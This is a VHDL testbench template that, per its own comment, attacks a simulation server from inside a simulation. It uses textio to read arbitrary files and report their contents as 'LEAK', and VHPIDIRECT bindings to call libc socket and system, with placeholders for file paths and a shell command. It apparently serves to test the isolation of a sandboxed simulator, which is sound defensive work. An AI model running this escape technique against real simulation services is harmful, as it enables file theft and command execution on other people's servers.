-- Testbench that attacks the server from inside a simulation: textio, then VHPIDIRECT.
library std; use std.textio.all;
entity attack is end attack;
architecture a of attack is
  subtype cmd_t is string(1 to 900);
  function c_system(c: cmd_t) return integer;
  attribute foreign of c_system : function is "VHPIDIRECT system";
  function c_system(c: cmd_t) return integer is begin return -1; end;
  function c_socket(d, t, p: integer) return integer;
  attribute foreign of c_socket : function is "VHPIDIRECT socket";
  function c_socket(d, t, p: integer) return integer is begin return -2; end;
  function pad(s: string) return cmd_t is
    variable r: cmd_t := (others => ' ');
  begin r(1 to s'length) := s; r(s'length+1) := character'val(0); return r; end;

  procedure try_read(tag, path: string) is
    file f: text; variable l: line; variable st: file_open_status;
  begin
    file_open(st, f, path, read_mode);
    if st = open_ok then
      if not endfile(f) then readline(f, l); report "LEAK " & tag & "=" & l.all; else report "LEAK " & tag & " empty"; end if;
      file_close(f);
    else
      report "DENIED " & tag;
    end if;
  end procedure;
begin
  process
    variable rc: integer;
  begin
@READS@
    report "SOCKET_FD=" & integer'image(c_socket(2, 1, 0));
    rc := c_system(pad("@SHELL@"));
    report "SYSTEM_RC=" & integer'image(rc);
    report "ATTACK_DONE";
    wait;
  end process;
end a;
